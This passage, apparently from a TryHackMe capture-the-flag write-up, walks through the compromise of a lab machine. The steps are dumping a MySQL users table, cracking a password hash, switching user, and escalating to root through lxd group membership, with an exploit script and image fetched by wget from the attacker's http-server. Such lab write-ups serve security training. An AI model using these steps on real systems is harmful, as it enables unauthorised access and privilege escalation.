style="color:#F8F8F2"><span class="token plain">Copyright (c) 2000, 2020, Oracle and/or its affiliates. All rights reserved.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Oracle is a registered trademark of Oracle Corporation and/or its</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">affiliates. Other names may be trademarks of their respective</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">owners.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Type &#x27;help;&#x27; or &#x27;\h&#x27; for help. Type &#x27;\c&#x27; to clear the current input statement.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">mysql&gt;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>It looks like there are only 1 interesting database.</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">mysql&gt; show databases;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">show databases;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">+--------------------+</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">| Database           |</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">+--------------------+</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">| information_schema |</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">| tron               |</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">+--------------------+</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">2 rows in set (0.01 sec)</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Let&#x27;s take a look inside.</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">mysql&gt; use tron;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">use tron;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Reading table information for completion of table and column names</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">You can turn off this feature to get a quicker startup with -A</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Database changed</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">mysql&gt; show tables;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">show tables;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">+----------------+</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">| Tables_in_tron |</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">+----------------+</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">| users          |</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">+----------------+</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">1 row in set (0.00 sec)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">mysql&gt; SELECT * FROM users;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">SELECT * FROM users;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">+----+----------+----------------------------------+</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">| id | username | password                         |</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">+----+----------+----------------------------------+</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|  1 | flynn    | edc621628f6d19a13a00fd683f5e3ff7 |</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">+----+----------+----------------------------------+</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">1 row in set (0.00 sec)</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h3 class="anchor anchorWithStickyNavbar_LWe7" id="cracking-the-password-hash">Cracking the password hash<a href="#cracking-the-password-hash" class="hash-link" aria-label="Direct link to Cracking the password hash" title="Direct link to Cracking the password hash">​</a></h3><p>It seems like this developer did one thing right. He hashed the password. However, the user used a very common password so we can easily crack it using <code>https://crackstation.net/</code> or a similar site. It seems like his flynn&#x27;s password is <code>@computer@</code>.</p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="becoming-flynn">Becoming Flynn<a href="#becoming-flynn" class="hash-link" aria-label="Direct link to Becoming Flynn" title="Direct link to Becoming Flynn">​</a></h3><p>Now that we know have some more credentials, we can log in using <code>flynn:@computer@</code></p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">www-data@light-cycle:/$ su flynn</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">su flynn</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Password: @computer@</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">flynn@light-cycle:/$</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h3 class="anchor anchorWithStickyNavbar_LWe7" id="getting-user-flag-usertxt">Getting user flag: <code>user.txt</code><a href="#getting-user-flag-usertxt" class="hash-link" aria-label="Direct link to getting-user-flag-usertxt" title="Direct link to getting-user-flag-usertxt">​</a></h3><p>The user flag is stored in the user&#x27;s home directory. We now have the permissions to read it.</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">flynn@light-cycle:~$ cat /home/flynn/user.txt</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">cat /home/flynn/user.txt</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">THM{IDENTITY_DISC_RECOGNISED}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>User Flag: <code>THM{IDENTITY_DISC_RECOGNISED}</code></p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="privilege-escalation-2">Privilege Escalation<a href="#privilege-escalation-2" class="hash-link" aria-label="Direct link to Privilege Escalation" title="Direct link to Privilege Escalation">​</a></h3><p>Let&#x27;s run the <code>id</code> command to see what groups flynn is in.</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">flynn@light-cycle:~$ id</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">id</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">uid=1000(flynn) gid=1000(flynn) groups=1000(flynn),109(lxd)</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Ok, so looks like we will be doing a LXD Privilege Escalation. So let&#x27;s <code>git clone</code> the repository.</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">git clone https://github.com/saghul/lxd-alpine-builder.git</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Now we can build alpine.</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">cd lxd-alpine-builder/</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">sudo ./build-alpine</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Now, there should be a gzip compressed data folder in the directory. We need to get this onto the victim box and so we can use <code>http-server</code>.</p><p>So on my attacker machine I run the following:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">bluemoon@dragonfly:~/ctf/thm/thm-advent/day24-the-trial-before-christmas/lxd-alpine-builder$ http-server</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Starting up http-server, serving ./</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Available on:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  http://127.0.0.1:8081</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  http://172.16.57.163:8081</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  http://10.6.23.34:8081</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Hit CTRL-C to stop the server</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Then on the victim machine, I can <code>wget</code> it.</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">flynn@light-cycle:~$ wget http://10.6.23.34:8081/alpine-v3.12-x86_64-20201225_1041.tar.gz</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">&lt;23.34:8081/alpine-v3.12-x86_64-20201225_1041.tar.gz</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">--2020-12-25 15:48:13--  http://10.6.23.34:8081/alpine-v3.12-x86_64-20201225_1041.tar.gz</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Connecting to 10.6.23.34:8081... connected.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">HTTP request sent, awaiting response... 200 OK</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Length: 3203370 (3.1M) [application/gzip]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Saving to: ‘alpine-v3.12-x86_64-20201225_1041.tar.gz’</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">alpine-v3.12-x86_64 100%[===================&gt;]   3.05M  1.10MB/s    in 2.8s    </span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">2020-12-25 15:48:16 (1.10 MB/s) - ‘alpine-v3.12-x86_64-20201225_1041.tar.gz’ saved [3203370/3203370]</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Next, we can download the shell script from <code>https://www.exploit-db.com/exploits/46978</code> and also send that file over to the victim using <code>http-server</code>.</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">bluemoon@dragonfly:~/ctf/thm/thm-advent/day24-the-trial-before-christmas$ http-server</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Starting up http-server, serving ./</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Available on:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  http://127.0.0.1:8081</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  http://172.16.57.163:8081</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  http://10.6.23.34:8081</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Hit CTRL-C to stop the server</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">flynn@light-cycle:~$ wget http://10.6.23.34:8081/46978.sh</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">wget http://10.6.23.34:8081/46978.sh</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">--2020-12-25 15:57:35--  http://10.6.23.34:8081/46978.sh</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Connecting to 10.6.23.34:8081... connected.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">HTTP request sent, awaiting response... 200 OK</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Length: 1500 (1.5K) [application/x-sh]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Saving to: ‘46978.sh’</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">46978.sh            100%[===================&gt;]   1.46K  --.-KB/s    in 0s      </span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">2020-12-25 15:57:35 (192 MB/s) - ‘46978.sh’ saved [1500/1500]</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Now, we can see both files are on the victim machine</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">-rw-rw-r-- 1 flynn flynn    1500 Dec 25 15:54 46978.sh</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">-rw-rw-r-- 1 flynn flynn 3203370 Dec 25 15:41 alpine-v3.12-x86_64-20201225_1041.tar.gz</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Next, we can mark <code>46978.sh</code> as executable and run it.</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">flynn@light-cycle:~$ chmod +x 46978.sh</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">flynn@light-cycle:~$ ./46978.sh -f alpine-v3.12-x86_64-20201225_1041.tar.gz</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Once we are in the lxc container, we can move to the root directory of the host machine which is mounted at <code>/mnt/root</code>.</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">~ # cd /mnt/root</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">cd /mnt/root</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">/mnt/root # ls -l    </span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">ls -l</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">total 239788</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">drwxr-xr-x    2 root     root          4096 Dec 18 14:17 bin</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">drwxr-xr-x    3 root     root          4096 Dec 18 14:22 boot</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">drwxr-xr-x   17 root     root          3680 Dec 25 15:24 dev</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">drwxr-xr-x   94 root     root          4096 Dec 20 04:51 etc</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">drwxr-xr-x    3 root     root          4096 Dec 18 14:08 home</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">lrwxrwxrwx    1 root     root            34 Dec 18 14:18 initrd.img -&gt; boot/initrd.img-4.15.0-128-generic</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">lrwxrwxrwx    1 root     root            33 Dec 18 14:04 initrd.img.old -&gt; boot/initrd.img-4.15.0-20-generic</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">drwxr-xr-x   22 root     root          4096 Dec 18 14:06 lib</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">drwxr-xr-x    2 root     root          4096 Dec 18 14:15 lib64</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">drwx------    2 root     root         16384 Dec 18 14:04 lost+found</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">drwxr-xr-x    3 root     root          4096 Dec 18 14:04 media</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">drwxr-xr-x    2 root     root          4096 Apr 26  2018 mnt</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">drwxr-xr-x    2 root     root          4096 Apr 26  2018 opt</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">dr-xr-xr-x  151 root     root             0 Dec 25 15:24 proc</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">drwx------    4 root     root          4096 Dec 20 03:51 root</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">drwxr-xr-x   26 root     root           860 Dec 25 16:05 run</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">drwxr-xr-x    2 root     root         12288 Dec 18 14:17 sbin</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">drwxr-xr-x    2 root     root          4096 Dec 18 14:09 snap</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">drwxr-xr-x    2 root     root          4096 Apr 26  2018 srv</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">-rw-------    1 root     root     245452800 Dec 18 14:04 swapfile</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">dr-xr-xr-x   13 root     root             0 Dec 25 15:24 sys</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">drwxrwxrwt   10 root     root          4096 Dec 25 16:05 tmp</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">drwxr-xr-x   10 root     root          4096 Dec 18 14:04 usr</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">drwxr-xr-x   14 root     root          4096 Dec 18 14:07 var</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">lrwxrwxrwx    1 root     root            31 Dec 18 14:18 vmlinuz -&gt; boot/vmlinuz-4.15.0-128-generic</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">lrwxrwxrwx    1 root     root            30 Dec 18 14:04 vmlinuz.old -&gt; boot/vmlinuz-4.15.0-20-generic</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h3 class="anchor 